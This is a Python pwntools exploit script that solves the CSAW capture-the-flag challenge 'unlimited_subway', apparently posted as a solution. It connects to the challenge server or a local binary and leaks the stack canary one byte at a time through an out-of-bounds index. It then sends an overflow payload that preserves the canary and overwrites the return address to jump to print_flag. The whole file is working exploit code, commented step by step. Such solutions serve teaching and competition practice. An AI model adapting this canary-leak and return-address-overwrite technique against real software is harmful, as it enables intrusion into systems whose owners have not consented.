#!/usr/bin/env python3

from pwn import *

exe = ELF("./unlimited_subway_patched")

context.binary = exe

# Define a function to establish a connection, either local or remote.
def conn():
    if args.LOCAL:
        r = process([exe.path])
        # If debugging is enabled, attach GDB to the local process.
        if args.DEBUG:
            gdb.attach(r)
    else:
        # Connect to a remote server.
        r = remote("pwn.csaw.io", 7900)

    # Return the connection object.
    return r

# Define the main function.
def main():
    # Establish the connection.
    r = conn()
    
    # Initialize the stack canary. 
    stack_canary = b"\x00"
    
    # Leak the stack canary.
    for i in range(3):
        r.sendline("V")
        input = 129 + i
        # Send the input to leak the stack canary.
        r.sendlineafter("Index : ", str(input).encode())
        
        r.readuntil(" : ") # Skip the first line.
        # Read the leaked stack canary bits
        stack_canary += bytes([int(r.readline().strip(), 16)])

    # Print the stack canary.
    print(":)))) Stack canary: ", stack_canary) 

    # Configure the input for exploitation.
    r.sendline("E")
    r.recvuntil("Name Size : ")
    r.sendline(str(256).encode())

    r.recvuntil('Name : ')
    
    # Set the target address for exploitation.
    addr = exe.symbols['print_flag']
    
    # Construct the payload with stack canary. padding and target address.
    payload = b'A' * 64 + stack_canary + b'AAAA' + p32(addr)
    
    # Send the payload and enter interactive mode.
    r.sendline(payload)
    r.interactive()

if __name__ == "__main__":
    main()
